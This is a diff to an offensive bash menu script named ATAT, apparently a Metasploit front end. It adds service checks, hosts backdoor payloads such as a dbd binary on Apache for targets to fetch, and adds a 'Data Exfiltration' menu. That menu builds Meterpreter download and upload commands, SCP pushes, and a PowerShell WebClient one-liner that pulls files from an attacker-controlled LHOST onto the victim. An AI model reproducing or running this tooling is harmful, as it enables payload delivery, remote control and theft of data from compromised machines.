@@ -3,23 +3,23 @@
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
 resize -s 150 150
 clear                                   # Clear the screen.
-SERVICE=service;
+SERVICE=Postgresql;
 secs=$(date '+%S');
 
-if ps ax | grep -v grep | grep postgresql > /dev/null
+if service postgresql status | grep -v grep | grep running > /dev/null
 then
     echo "$SERVICE service running"
 else
     echo "$SERVICE is not running, Starting service." 
-    sudo service postgresql start
+    service postgresql start
 fi 
-SERVICE1=service;
+SERVICE1=Metasploit;
 if ps ax | grep -v grep | grep metasploit > /dev/null
 then
     echo "$SERVICE1 service running"
 else
     echo "$SERVICE1 is not running, Starting service." 
-    sudo service metasploit start
+    service metasploit start
 fi 
 mkdir ~/Desktop/temp 
 clear
@@ -191,10 +191,10 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your All
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[0] \e[90mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m:::\e[97m[11]\e[90mData Exfiltration     \e[97m[Loot & Profit]   \E[1;34m"
 tput sgr0
-#echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
-#tput sgr0
+echo -e "\E[1;34m===\e[97m[0] \e[32mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+tput sgr0
 #echo -e "\E[1;34m===\e[97m[13]\e[34mLoad Balance Detection\e[97m[Run LBD Against Many Targets]  \E[1;34m"
 #tput sgr0
 #echo -e "\E[1;34m:::\e[97m[14]\e[95mMulti-Target SSLScan \e[97m [Run SSLScan Against Many Targets]   \E[1;34m"
@@ -355,9 +355,17 @@ do
 		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
 		chown www-data:www-data /var/www/html/winmgnt.txt
 		chown www-data:www-data /var/www/html/taskmgnt.txt
-		service apache2 start
 		clear
 		#rm dbd.exe
+		SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi  
 		cd ~/ATAT
 		echo "Starting Apache server to host payloads..."
 		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
@@ -426,9 +434,17 @@ do
 		cp ~/ATAT/taskmgnt.txt /var/www/html/taskmgnt.txt
 		chown www-data:www-data /var/www/html/winmgnt.txt
 		chown www-data:www-data /var/www/html/taskmgnt.txt
-		service apache2 start
 		clear
 		#rm dbd.exe
+		SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi  
 		cd ~/ATAT
 		echo "Starting Apache server to host payloads..."
 		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
@@ -492,7 +508,15 @@ do
 		cp ~/ATAT/misc/dbd/dbd /var/www/html
 		chown www-data:www-data /var/www/html/dbd
 		echo "Starting Apache server to host payloads..."
+		SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
 		service apache2 start
+	fi  
 		#rm dbd
 		#clear
 		cd ~/ATAT
@@ -532,7 +556,15 @@ do
 		cp ~/ATAT/misc/dbd/dbd /var/www/html
 		chown www-data:www-data /var/www/html/dbd
 		echo "Starting Apache server to host payloads..."
+		SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
 		service apache2 start
+	fi  
 		#rm dbd
 		clear
 		cd ~/ATAT
@@ -1330,6 +1362,56 @@ do
     echo -e "\E[1;34m::::: \e[97mUse Ctrl+C In Jammer Window to Stop Attack\E[1;34m:::::"
 	python ~/wifijammer-ng/wifijammer.py -m $usertargets -p 15
             ;;                 
+        "Main Menu")
+            ~/ATAT/ATAT.sh
+            ;;
+        "Quit")
+            echo "Aufiederszehn" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done 
+  
+;;
+
+ "11" | "11" )
+         
+ echo -e "\E[1;34m::::: \e[97mData Exfiltration\E[1;34m:::::"
+ 
+PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Main Menu" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+		"Push File To Target with SCP - Creds Required")	
+	read -p 'Enter Local File Including Full Path: ' userfile; read -p 'Enter Username On Target Machine: ' username; read -p 'Enter Target Machine Name / IP: ' usermachine; read -p 'Enter File Destination Full Path on Target Machine: ' userpath;
+	scp $userfile $username@$usermachine:$userpath
+		    ;;
+		"Data Exfiltration")	
+	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
+		#echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
+		#echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
+		
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+        echo download \"$remoteuserfile\" \"$msflocaluserpath\"
+		    ;;
+		"Push File To Target with PSH / Meterpreter")
+	SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Including Full Path (/var/www/html/filename.ext): ' localuserfile; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Target Machine for MSF (%WINDIR%\\\\\System32\\\\\file.ext): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
+		echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+        echo upload $localuserfile $msfuserpath
+            ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
